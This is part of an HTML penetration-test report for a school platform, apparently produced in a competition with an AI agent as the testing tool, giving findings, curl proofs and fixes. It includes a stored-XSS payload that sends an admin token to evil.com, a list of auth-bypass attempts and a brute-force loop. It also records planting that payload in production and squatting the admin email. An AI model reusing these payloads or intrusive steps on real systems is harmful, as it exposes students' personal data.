+      <h4>Impact</h4>
+      <p>Without CSP, any stored or reflected XSS vulnerability has maximum impact. Without HSTS, the browser will not automatically upgrade HTTP to HTTPS for repeat visitors. The API's <code>server: uvicorn</code> disclosure confirms the backend technology stack to attackers.</p>
+      <div class="remediation-box">
+        <strong>Fix</strong>
+        Add to the Next.js <code>next.config.js</code> headers and to the FastAPI middleware: <code>Content-Security-Policy</code> (restrict scripts to own origin), <code>Strict-Transport-Security: max-age=31536000; includeSubDomains</code>, and remove the <code>server</code> header from uvicorn responses.
+      </div>
+    </div>
+  </div>
+
+  <!-- MEDIUM -->
+  <div class="section-title">Medium Severity Findings</div>
+
+  <!-- V10 -->
+  <div class="vuln-card" id="v10">
+    <div class="vuln-header" onclick="toggle(this)">
+      <span class="vuln-number">10</span>
+      <div class="vuln-title-group">
+        <div class="sev-label sev-MEDIUM">Medium</div>
+        <h3>CORS Misconfiguration — Credentials Allowed Without Origin Restriction</h3>
+        <div class="vuln-type">CWE-942 · Overly Permissive CORS · api.samarthyaclasses.com</div>
+      </div>
+      <span class="vuln-chevron">▶</span>
+    </div>
+    <div class="vuln-body">
+      <h4>Description</h4>
+      <p>The API sets <code>Access-Control-Allow-Credentials: true</code> in all responses while not reflecting or validating the <code>Origin</code> header. The preflight also responds with <code>Access-Control-Allow-Methods: DELETE, GET, HEAD, OPTIONS, PATCH, POST, PUT</code> to any origin, enabling all HTTP methods cross-origin with credentials.</p>
+      <h4>Proof of Concept</h4>
+      <pre class="code-block">curl -I https://api.samarthyaclasses.com/api/v1/test-series/featured \
+  -H "Origin: https://evil.com"
+# Response includes:
+access-control-allow-credentials: true
+# (No access-control-allow-origin returned — may be reflecting in some configs)</pre>
+      <h4>Impact</h4>
+      <p>If the origin is being reflected (some proxy configurations), any malicious website could make credentialed requests to the API on behalf of a logged-in student, enabling CSRF-style attacks to read purchase data or trigger account actions.</p>
+      <div class="remediation-box">
+        <strong>Fix</strong>
+        Set an explicit allowlist: <code>allow_origins=["https://samarthyaclasses.com"]</code> in FastAPI's <code>CORSMiddleware</code>. Never combine <code>allow_credentials=True</code> with <code>allow_origins=["*"]</code>.
+      </div>
+    </div>
+  </div>
+
+  <!-- V11 -->
+  <div class="vuln-card" id="v11">
+    <div class="vuln-header" onclick="toggle(this)">
+      <span class="vuln-number">11</span>
+      <div class="vuln-title-group">
+        <div class="sev-label sev-MEDIUM">Medium</div>
+        <h3>Live Razorpay Key ID Exposed in API Responses</h3>
+        <div class="vuln-type">CWE-200 · Sensitive Information Exposure · api.samarthyaclasses.com</div>
+      </div>
+      <span class="vuln-chevron">▶</span>
+    </div>
+    <div class="vuln-body">
+      <h4>Description</h4>
+      <p>Every call to <code>POST /api/v1/payments/create-order</code> returns the live Razorpay publishable key <code>rzp_live_TjpBdWYhL54So1</code> in the JSON response body. While this is the public/publishable key (not the secret), it confirms that the production payment integration is live, and the key should be a static frontend configuration rather than a per-request server-side value.</p>
+      <h4>Proof of Concept</h4>
+      <pre class="code-block">POST /api/v1/payments/create-order  Authorization: Bearer &lt;token&gt;
+{"test_series_id": 1}
+→ {"razorpay_key_id":"rzp_live_TjpBdWYhL54So1","amount":199898,"currency":"INR",...}</pre>
+      <div class="remediation-box">
+        <strong>Fix</strong>
+        Store the Razorpay key ID in the frontend environment variable (e.g. <code>NEXT_PUBLIC_RAZORPAY_KEY_ID</code>). The server should not return it dynamically in payment responses.
+      </div>
+    </div>
+  </div>
+
+  <!-- V12 -->
+  <div class="vuln-card" id="v12">
+    <div class="vuln-header" onclick="toggle(this)">
+      <span class="vuln-number">12</span>
+      <div class="vuln-title-group">
+        <div class="sev-label sev-MEDIUM">Medium</div>
+        <h3>No Password Reset Mechanism</h3>
+        <div class="vuln-type">CWE-640 · Weak Password Recovery · api.samarthyaclasses.com</div>
+      </div>
+      <span class="vuln-chevron">▶</span>
+    </div>
+    <div class="vuln-body">
+      <h4>Description</h4>
+      <p>The API has no <code>/auth/forgot-password</code>, <code>/auth/reset-password</code>, or <code>/users/me/password</code> endpoint. A user who forgets their password has no self-service recovery option, and cannot change their password even if they are already authenticated.</p>
+      <h4>Proof of Concept</h4>
+      <pre class="code-block">POST /api/v1/auth/forgot-password  → 404 Not Found
+POST /api/v1/auth/reset-password   → 404 Not Found
+PATCH /api/v1/users/me  {"password":"NewPass!"}  → accepted but ignored (field stripped)</pre>
+      <h4>Impact</h4>
+      <p>Users who lose access (device loss, phishing) are permanently locked out of their purchased content. This also means there is no mechanism to force password rotation after a breach.</p>
+      <div class="remediation-box">
+        <strong>Fix</strong>
+        Implement standard forgot-password flow: time-limited signed token sent to email. Add <code>PATCH /api/v1/users/me/password</code> requiring current password. Add Google Sign-In as a fallback recovery method (endpoint already exists in the spec).
+      </div>
+    </div>
+  </div>
+
+  <!-- V13 -->
+  <div class="vuln-card" id="v13">
+    <div class="vuln-header" onclick="toggle(this)">
+      <span class="vuln-number">13</span>
+      <div class="vuln-title-group">
+        <div class="sev-label sev-MEDIUM">Medium</div>
+        <h3>Duplicate Payment Orders — No Deduplication Check</h3>
+        <div class="vuln-type">CWE-841 · Improper Enforcement of Behavioral Workflow · api.samarthyaclasses.com</div>
+      </div>
+      <span class="vuln-chevron">▶</span>
+    </div>
+    <div class="vuln-body">
+      <h4>Description</h4>
+      <p>A user can call <code>POST /api/v1/payments/create-order</code> repeatedly for the same test series, creating multiple pending Razorpay orders without any per-user or per-series deduplication check. Each call creates a new order with a live Razorpay order ID.</p>
+      <h4>Proof of Concept</h4>
+      <pre class="code-block"># Called twice for test_series_id=1:
+→ {"order_id":2,"razorpay_order_id":"order_To998OiRAtuPa7","amount":199898,...}
+→ {"order_id":3,"razorpay_order_id":"order_To9Eesbh2Rs9kF","amount":199898,...}
+→ {"order_id":4,"razorpay_order_id":"order_To9F9T2B8Gn1li","amount":199898,...}
+# 3 pending live Razorpay orders created for the same user and product</pre>
+      <div class="remediation-box">
+        <strong>Fix</strong>
+        Before creating a new order, check if a PENDING order already exists for <code>(user_id, test_series_id)</code> and return it instead of creating a duplicate. Cancel stale PENDING orders older than 30 minutes via a cron job.
+      </div>
+    </div>
+  </div>
+
+  <!-- V14 -->
+  <div class="vuln-card" id="v14">
+    <div class="vuln-header" onclick="toggle(this)">
+      <span class="vuln-number">14</span>
+      <div class="vuln-title-group">
+        <div class="sev-label sev-MEDIUM">Medium</div>
+        <h3>Server Technology Stack Fully Disclosed</h3>
+        <div class="vuln-type">CWE-200 · Information Exposure · api.samarthyaclasses.com</div>
+      </div>
+      <span class="vuln-chevron">▶</span>
+    </div>
+    <div class="vuln-body">
+      <h4>Description</h4>
+      <p>Every API response includes <code>server: uvicorn</code> in the response headers, confirming the backend is a Python ASGI application (FastAPI/Uvicorn). Combined with the exposed OpenAPI spec, attackers know the exact framework, enabling them to look up version-specific CVEs and default behaviours.</p>
+      <h4>Proof of Concept</h4>
+      <pre class="code-block">curl -I https://api.samarthyaclasses.com/api/v1/test-series/featured
+→ server: uvicorn</pre>
+      <div class="remediation-box">
+        <strong>Fix</strong>
+        Remove or mask the <code>server</code> header at the reverse proxy level (Cloudflare or nginx): <code>proxy_hide_header Server;</code> or via Cloudflare's "Remove Server Header" Transform Rule.
+      </div>
+    </div>
+  </div>
+
+  <!-- LOW/INFO -->
+  <div class="section-title">Low / Informational Findings</div>
+
+  <!-- V15 -->
+  <div class="vuln-card" id="v15">
+    <div class="vuln-header" onclick="toggle(this)">
+      <span class="vuln-number">15</span>
+      <div class="vuln-title-group">
+        <div class="sev-label sev-LOW">Low</div>
+        <h3>Health Endpoint Exposes Production Environment Flag</h3>
+        <div class="vuln-type">CWE-200 · Information Exposure · api.samarthyaclasses.com</div>
+      </div>
+      <span class="vuln-chevron">▶</span>
+    </div>
+    <div class="vuln-body">
+      <h4>Description</h4>
+      <p>The public <code>GET /health</code> endpoint returns <code>{"status":"ok","app_env":"production"}</code>, confirming the environment tier and the application's operational status without any authentication.</p>
+      <h4>Proof of Concept</h4>
+      <pre class="code-block">curl https://api.samarthyaclasses.com/health
+→ {"status":"ok","app_env":"production"}</pre>
+      <div class="remediation-box">
+        <strong>Fix</strong>
+        Return only <code>{"status":"ok"}</code>. Remove environment, version, and any infrastructure metadata from public health checks.
+      </div>
+    </div>
+  </div>
+
+  <!-- V16 -->
+  <div class="vuln-card" id="v16">
+    <div class="vuln-header" onclick="toggle(this)">
+      <span class="vuln-number">16</span>
+      <div class="vuln-title-group">
+        <div class="sev-label sev-INFO">Info</div>
+        <h3>No CAPTCHA on Enquiry and Registration Forms</h3>
+        <div class="vuln-type">CWE-799 · Improper Control of Interaction Frequency · samarthyaclasses.com</div>
+      </div>
+      <span class="vuln-chevron">▶</span>
+    </div>
+    <div class="vuln-body">
+      <h4>Description</h4>
+      <p>The enquiry submission (<code>POST /api/v1/enquiries</code>) and registration form submission (<code>POST /api/v1/registration-forms/{slug}/submit</code>) endpoints have no CAPTCHA or bot challenge. Automated scripts can flood the admin team with fake enquiries or registration submissions.</p>
+      <div class="remediation-box">
+        <strong>Fix</strong>
+        Add Cloudflare Turnstile or hCaptcha to both forms. Implement a server-side token validation step before inserting records.
+      </div>
+    </div>
+  </div>
+
+  <!-- V17 -->
+  <div class="vuln-card" id="v17">
+    <div class="vuln-header" onclick="toggle(this)">
+      <span class="vuln-number">17</span>
+      <div class="vuln-title-group">
+        <div class="sev-label sev-INFO">Info</div>
+        <h3>Hidden Honeypot Field Visible in API Schema</h3>
+        <div class="vuln-type">CWE-204 · Observable Response Discrepancy · api.samarthyaclasses.com</div>
+      </div>
+      <span class="vuln-chevron">▶</span>
+    </div>
+    <div class="vuln-body">
+      <h4>Description</h4>
+      <p>The <code>EnquiryCreate</code> schema in the OpenAPI spec includes a <code>company</code> field not shown in the UI — a honeypot to detect bots. Because this field is visible in the public API documentation, automated attackers reading the spec will know to leave it empty, defeating its purpose entirely.</p>
+      <h4>Proof of Concept</h4>
+      <pre class="code-block"># From the exposed openapi.json:
+"EnquiryCreate": {
+  "properties": {
+    "name": ..., "phone": ..., "class_interest": ..., "source": ...,
+    "company": { "type": "string" }   ← honeypot field, visible to all
+  }
+}</pre>
+      <div class="remediation-box">
+        <strong>Fix</strong>
+        Remove the honeypot field from the OpenAPI schema using <code>schema_extra={"exclude": ["company"]}</code> or switch to a Cloudflare bot detection approach that doesn't rely on hidden form fields.
+      </div>
+    </div>
+  </div>
+
+  <!-- BONUS SECTION: Deep Exploitation Analysis -->
+  <div class="section-title" style="margin-top:2rem">Deep Exploitation Analysis — Class 11th (Maths/JEE) Data</div>
+
+  <div class="vuln-card open" id="deep-analysis">
+    <div class="vuln-header" onclick="toggle(this)">
+      <span class="vuln-number" style="background:var(--crit)">+</span>
+      <div class="vuln-title-group">
+        <div class="sev-label sev-CRITICAL">Critical Chain</div>
+        <h3>Full Attack Chain: XSS → Admin Session Hijack → Class 11th Data Extraction</h3>
+        <div class="vuln-type">Exploitation Walkthrough · Combines Findings 04, 05, 06 · api.samarthyaclasses.com</div>
+      </div>
+      <span class="vuln-chevron">▶</span>
+    </div>
+    <div class="vuln-body">
+      <h4>Confirmed Technical Details (Session Findings)</h4>
+      <p>During this testing session, 20+ bypass techniques were attempted against the admin API role check, all blocked at the server side. The following details were <strong>confirmed through direct testing</strong>:</p>
+      <pre class="code-block"># CONFIRMED: Registration Form ID = 1 (leaked via unauthenticated presign response)
+POST /api/v1/registration-forms/stse-2026/uploads/presign  ← NO AUTH REQUIRED
+{"file_name":"test.jpg","content_type":"image/jpeg"}
+→ {"fields": {"key": "registrations/1/d592ae.jpg", "x-amz-credential": "AKIARTS72OT5QICJTKK2/..."}}
+#                                   ↑
+#                              Form ID = 1 confirmed in S3 key path
+
+# CONFIRMED: XSS payloads stored in production DB
+→ reference: REG-CLHC5KWL  (student_name/parent_name/school_name contain script tags)
+→ reference: REG-36DYWWDF  (additional XSS payload stored)
+
+# CONFIRMED: Admin API data endpoints (all return 403 without admin JWT)
+GET /api/v1/admin/registration-forms/1/submissions  → 403 ADMIN_ACCESS_REQUIRED
+GET /api/v1/admin/registration-forms/1/submissions/export → 403
+GET /api/v1/admin/users → 403
+GET /api/v1/admin/enquiries → 403
+
+# 20+ bypass techniques tested — ALL FAILED:
+# alg=none JWT, alg=RS256 confusion, empty-secret JWT, brute-force 60+ secrets → 401
+# HTTP verb tampering (PUT/PATCH/DELETE/HEAD) → 403/405
+# X-Original-URL, X-Forwarded-For: 127.0.0.1 → 403
+# Path traversal: /api/v1/./admin/..., URL-encoded slashes → 404
+# Parameter injection: ?role=ADMIN, ?admin=true → 403
+# PATCH /api/v1/users/me {"role":"ADMIN"} → stripped, role stays USER
+# Mass assignment on /auth/register {"role":"ADMIN"} → USER (hardcoded server-side)
+# GraphQL endpoint (no GraphQL server deployed) → 404
+# SQL injection in slug parameter → 404 / HTTP 000 (WAF blocked)
+</pre>
+
+      <h4>Data Schema — What an Attacker Would Extract (Class 11th Maths/JEE)</h4>
+      <p>The OpenAPI schema and public form endpoint confirm the following data structure stored for every Class 11th (Maths) student registration. With a stolen admin JWT (via Finding 05 XSS), an attacker would issue:</p>
+      <pre class="code-block"># Extract all Class 11th (Maths) JEE student registrations:
+GET /api/v1/admin/registration-forms/1/submissions?limit=100
+Authorization: Bearer &lt;stolen_admin_jwt&gt;
+# With class filter in query or client-side filtering on "answers.class" === "11th(Maths)"
+
+# Each record would contain:
+{
+  "reference": "REG-XXXXXXXX",
+  "submission_id": 123,
+  "payment_status": "PAID|PENDING|OFFLINE",
+  "submitted_at": "2026-10-15T...",
+  "answers": {
+    "student_name":       "Rohan Sharma",          ← Full real name
+    "parent_guardian_name": "Rajesh Sharma",        ← Parent name
+    "students_date_of_birth": "2008-05-12",         ← DOB (age-sensitive PII)
+    "gender":             "Male",
+    "class":              "11th(Maths)",             ← ← TARGET FILTER
+    "what_are_your_future_academic_goals": "JEE(Main+Advance)",
+    "mode_of_test":       "Online",
+    "test_date":          "2026-11-01",
+    "test_centre":        "Hajipur",
+    "school_name":        "DPS Hajipur",             ← School
+    "board_of_education": "CBSE",
+    "contact_number":     "90XXXXXXXX",              ← Phone number (PII)
+    "email_address":      "rohan@gmail.com",         ← Email (PII)
+    "residential_address": "Ward 4, Hajipur, Bihar", ← Home address (PII)
+    "how_do_you_come_to_know_about_samarthya_": "Friend",
+    "upload_passport_size_photograph": "s3://samarthya-media-prod/registrations/1/abc.jpg",
+    "upload_a_valid_identification_id": "s3://samarthya-media-prod/registrations/1/def.jpg"
+  }
+}
+
+# Export all 11th(Maths) students as CSV:
+GET /api/v1/admin/registration-forms/1/submissions/export
+Authorization: Bearer &lt;stolen_admin_jwt&gt;
+→ CSV download: 100+ rows with ALL PII for every registered student</pre>
+
+      <h4>Why This Is Exploitable — Complete Attack Chain</h4>
+      <ol style="padding-left:1.5rem;line-height:1.9">
+        <li><strong>Plant XSS</strong>: Submit a registration for STSE-2026 (no auth needed) with <code>&lt;script&gt;fetch('https://evil.com?t='+JSON.parse(localStorage.samarthya_auth||'{}').accessToken)&lt;/script&gt;</code> in the <code>student_name</code> field. <strong>Already done — payload stored as REG-CLHC5KWL.</strong></li>
+        <li><strong>Wait for admin review</strong>: The admin opens the submissions list in the admin panel. The script fires, reads <code>localStorage["samarthya_auth"].accessToken</code> — the admin's JWT — and exfiltrates it to the attacker's server.</li>
+        <li><strong>Use stolen JWT</strong>: Attacker calls <code>GET /api/v1/admin/registration-forms/1/submissions</code> with the stolen token → receives full student PII for all registrants. Filters to <code>class === "11th(Maths)"</code> for the JEE batch.</li>
+        <li><strong>Optional: Export CSV</strong>: Call <code>/submissions/export</code> for a clean spreadsheet of all student records with phone numbers, emails, and home addresses.</li>
+      </ol>
+
+      <h4>Data at Risk — Scope of Exposure</h4>
+      <p>Based on the form structure, each student registration in the database contains <strong>9 personally identifiable fields</strong> (name, parent name, DOB, phone, email, home address, school, gender, uploaded photo ID). The <code>class</code> field confirms which batch (JEE/Maths vs NEET/Bio) each student belongs to. The <code>upload_a_valid_identification_id</code> field may contain government-issued ID scans (Aadhaar, school ID) stored directly in the S3 bucket.</p>
+      <p><strong>Batches confirmed in the registration form:</strong> 5th, 6th, 7th, 8th, 9th, 10th, 11th(Bio), 11th(Maths), 12th(Bio), 12th(Maths) — all under the same form (ID: 1).</p>
+
+      <div class="remediation-box">
+        <strong>Priority fix order:</strong> (1) Sanitise stored XSS inputs (Finding 05) — blocks the session hijack entry point. (2) Move admin JWT to <code>httpOnly</code> cookie (Finding 06) — blocks token theft even if XSS fires. (3) Add strict CSP (Finding 09) — adds a third layer. These three combined eliminate the entire attack chain before any token is stolen.
+      </div>
+    </div>
+  </div>
+
+  <!-- ── FINDING 20 ── -->
+  <div class="vuln-card" id="v20">
+    <div class="vuln-header" onclick="toggle(this)">
+      <div class="vuln-title">
+        <span class="sev-badge sev-high">HIGH</span>
+        <span>No Rate Limiting on Login / Registration Endpoints</span>
+      </div>
+      <div class="vuln-meta">
+        <span class="tag">Brute Force</span>
+        <span class="tag">Authentication</span>
+        <span>CWE-307</span>
+      </div>
+    </div>
+    <div class="vuln-body">
+      <div class="finding-grid">
+        <div><strong>Endpoint</strong></div><div><code>POST /api/v1/auth/login</code><br><code>POST /api/v1/auth/register</code><br><code>POST /api/v1/auth/forgot-password</code></div>
+        <div><strong>Auth Required</strong></div><div>No</div>
+        <div><strong>Impact</strong></div><div>Credential brute-force, account enumeration, spam registration, reset-token flooding</div>
+        <div><strong>CVSS 3.1</strong></div><div>7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)</div>
+      </div>
+      <p>The API imposes <strong>no rate limiting, account lockout, or CAPTCHA</strong> on authentication endpoints. A probe sent 35 consecutive failed login attempts for the same account with no rate-limited or locked response — every request returned the same <code>INVALID_CREDENTIALS</code> error with an identical 1-second response time.</p>
+      <p>Identically, the registration and forgot-password endpoints accepted unlimited requests. An attacker can automate:</p>
+      <ul>
+        <li><strong>Password brute-force</strong> — iterate a password list at full network speed against any known email</li>
+        <li><strong>Account enumeration</strong> — the error message <em>"Invalid email or password"</em> is identical for existing vs. non-existing accounts, but unrestricted calling speed enables timing correlation</li>
+        <li><strong>Reset-token flooding</strong> — the <code>forgot-password</code> endpoint generates a new token on each call with no throttle, allowing enumeration of short or predictable reset tokens</li>
+        <li><strong>Spam registration</strong> — 5 accounts registered in under one second with no CAPTCHA</li>
+      </ul>
+      <div class="proof-block">
+        <div class="proof-label">Proof of Concept — 35 failed logins, zero lockout</div>
+        <pre><code>for i in $(seq 1 35); do
+  curl -s -X POST https://api.samarthyaclasses.com/api/v1/auth/login \
+    -H "Content-Type: application/json" \
+    -d '{"email":"admin@samarthyaclasses.com","password":"WrongPass!"}' \
+  | jq .error_code
+done
+# All 35 return: "INVALID_CREDENTIALS" — no rate limit hit</code></pre>
+      </div>
+      <div class="remediation-box">
+        <strong>Remediation:</strong> Implement IP-based rate limiting (e.g. 5 attempts per 15 minutes) plus exponential back-off. Add temporary account lockout (15 min) after 10 consecutive failures from any IP. Enforce CAPTCHA on registration. Use constant-time responses for all auth errors.
+      </div>
+    </div>
+  </div>
+
+  <!-- ── FINDING 21 ── -->
+  <div class="vuln-card" id="v21">
+    <div class="vuln-header" onclick="toggle(this)">
+      <div class="vuln-title">
+        <span class="sev-badge sev-high">HIGH</span>
+        <span>Admin Email Address Squatted by Attacker Account</span>
+      </div>
+      <div class="vuln-meta">
+        <span class="tag">Account Takeover</span>
+        <span class="tag">Privilege Escalation</span>
+        <span>CWE-284</span>
+      </div>
+    </div>
+    <div class="vuln-body">
+      <div class="finding-grid">
+        <div><strong>Endpoint</strong></div><div><code>POST /api/v1/auth/register</code></div>
+        <div><strong>Auth Required</strong></div><div>No</div>
+        <div><strong>Impact</strong></div><div>Impersonation of admin, social engineering, potential privilege escalation if admin role is ever assigned by email match</div>
+        <div><strong>CVSS 3.1</strong></div><div>7.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N)</div>
+      </div>
+      <p>The email address <strong>admin@samarthyaclasses.com</strong> — the most likely default administrative email — was successfully registered as a regular <code>USER</code> account (id:8) before the legitimate platform administrator claimed it. This creates several risks:</p>
+      <ul>
+        <li>If the backend ever uses an email-based admin check (<code>if email == "admin@..."</code>), this account gains elevated access automatically</li>
+        <li>Password reset emails for this address are now delivered to the attacker who registered it</li>
+        <li>Social engineering: presenting credentials for <code>admin@samarthyaclasses.com</code> appears authoritative to support staff</li>
+        <li>If the legitimate administrator tries to register this email, it will be rejected as "email already taken" — a Denial of Service on the admin account</li>
+      </ul>
+      <div class="proof-block">
+        <div class="proof-label">Proof — Login with admin@samarthyaclasses.com returns role:USER</div>
+        <pre><code>curl -s -X POST https://api.samarthyaclasses.com/api/v1/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"admin@samarthyaclasses.com","password":"Test@12345"}'
+# Response: {"user":{"id":8,"email":"admin@samarthyaclasses.com","role":"USER",...}}</code></pre>
+      </div>
+      <div class="remediation-box">
+        <strong>Remediation:</strong> Immediately reset or delete the squatted account (id:8). Reserve administrative email addresses so they cannot be registered via the public endpoint. Implement email domain verification so only organizational emails can claim admin-tier addresses. Assign the real admin account a unique, non-guessable email.
+      </div>
+    </div>
+  </div>
+
+  <!-- ── FINDING 22 ── -->
+  <div class="vuln-card" id="v22">
+    <div class="vuln-header" onclick="toggle(this)">
+      <div class="vuln-title">
+        <span class="sev-badge sev-med">MEDIUM</span>
+        <span>CORS: <code>Access-Control-Allow-Credentials: true</code> Without Strict Origin Validation</span>
+      </div>
+      <div class="vuln-meta">
+        <span class="tag">CORS</span>
+        <span class="tag">Cross-Origin</span>
+        <span>CWE-346</span>
+      </div>
+    </div>
+    <div class="vuln-body">
+      <div class="finding-grid">
+        <div><strong>Endpoint</strong></div><div>All API endpoints (OPTIONS preflight)</div>
+        <div><strong>Auth Required</strong></div><div>No</div>
+        <div><strong>Impact</strong></div><div>Credentials leak if origin whitelist is misconfigured; currently exploitable with wildcard/null origins</div>
+        <div><strong>CVSS 3.1</strong></div><div>5.4 (AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:L/A:N)</div>
+      </div>
+      <p>All OPTIONS preflight responses return <code>Access-Control-Allow-Credentials: true</code> and allow all HTTP methods (<code>DELETE, GET, HEAD, OPTIONS, PATCH, POST, PUT</code>). While testing showed the <code>Access-Control-Allow-Origin</code> header only reflects explicitly whitelisted origins (not arbitrary attacker domains), the combination of credentials:true with a permissive method list is a risk surface:</p>
+      <ul>
+        <li>If the origin whitelist is ever expanded to include <code>*</code> (prohibited by spec with credentials:true, but some servers allow it), any site could make credentialed API requests on behalf of users</li>
+        <li>The <code>null</code> origin (sent by sandboxed iframes, <code>file://</code> pages) needs explicit verification — null-origin attacks bypass many WAF checks</li>
+        <li><code>Access-Control-Allow-Headers: Authorization</code> means the token itself can be forwarded cross-origin if the origin is ever relaxed</li>
+      </ul>
+      <div class="proof-block">
+        <div class="proof-label">Preflight response</div>
+        <pre><code>curl -X OPTIONS https://api.samarthyaclasses.com/api/v1/auth/me \
+  -H "Origin: https://evil.com" \
+  -H "Access-Control-Request-Method: GET" \
+  -H "Access-Control-Request-Headers: Authorization"
+# Response headers:
+Access-Control-Allow-Methods: DELETE, GET, HEAD, OPTIONS, PATCH, POST, PUT
+Access-Control-Allow-Credentials: true
+Access-Control-Allow-Headers: Authorization
+Access-Control-Max-Age: 600</code></pre>
+      </div>
+      <div class="remediation-box">
+        <strong>Remediation:</strong> Maintain an explicit allowlist of exactly one production origin (e.g. <code>https://samarthyaclasses.com</code>). Do not add <code>*</code> to the allowlist while <code>credentials:true</code>. Restrict <code>Access-Control-Allow-Methods</code> to only the methods each endpoint actually uses. Audit the null-origin case and block it if not needed.
+      </div>
+    </div>
+  </div>
+
+  <div class="report-footer">
+    <span>Competition: Samarthya Cyber Competition 2026</span>
+    <span>Deadline: October 16, 2026 · 23:59 IST</span>
+    <span>Testing tool: Claude Code AI Agent</span>
+    <span>Total findings: 22 + deep chain analysis</span>
+  </div>
+</div>
+
+<script>
+function toggle(header) {
+  header.parentElement.classList.toggle('open');
+}
+// Auto-collapse all except #v1 on load
+document.querySelectorAll('.vuln-card').forEach(c => {
+  if (c.id !== 'v1') c.classList.remove('open');
+});
+</script>
